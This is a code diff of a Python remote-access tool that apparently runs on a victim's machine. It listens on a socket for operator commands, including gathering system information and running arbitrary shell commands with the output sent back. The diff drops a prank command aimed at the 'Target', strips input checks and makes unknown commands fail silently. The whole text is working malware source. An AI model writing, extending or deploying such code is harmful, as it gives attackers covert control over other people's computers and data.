@@ -196,10 +196,7 @@ def shell(handler=handler):
                 break
             elif command[0] == "openurl":
                 openurl(command[1])
-            elif command[0] == "rickroll":
-                browser.open("https://www.youtube.com/watch?v=oHg5SJYRHA0")
-                unicorn.send((badges.S + "Target has been rickrolled!").encode("UTF-8"))
-            elif command[0] == "cd":
+            elif command[0] == "chdir":
                 directory = command[1]
                 if not directory.strip():
                     unicorn.send("{}".format(os.getcwd()).encode("UTF-8"))
@@ -225,7 +222,9 @@ def shell(handler=handler):
             elif command[0] == "say":
                 say_message(command[1])
             elif command[0] == "pwd":
-                unicorn.send(str(os.getcwd()).encode("UTF-8"))
+                unicorn.send((badges.I + "Current working directory: " + str(os.getcwd())).encode("UTF-8"))
+            elif command[0] == "pid":
+                unicorn.send((badges.I + "PID: " + str(os.getpid())).encode("UTF-8"))
             elif command[0] == "sysinfo":
                 sysinfo = ""
                 sysinfo += f"Operating System: {platform.system()}\n"
@@ -235,13 +234,9 @@ def shell(handler=handler):
                 sysinfo += f"Processor Architecture: {platform.processor()}"
                 unicorn.send(sysinfo.encode("UTF-8"))
             elif command[0] == "shell":
-                if len(command) < 2:
-                    unicorn.send("Usage: shell <command>".encode("UTF-8"))
-                else:
-                    command_output = execute(command[1])
-                    unicorn.send(bytes(command_output.strip()))
+                unicorn.send(bytes(execute(command[1]).strip()))
             else:
-                unicorn.send((badges.E +"Unrecognized command!").encode())
+                pass
     sys.exit()
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
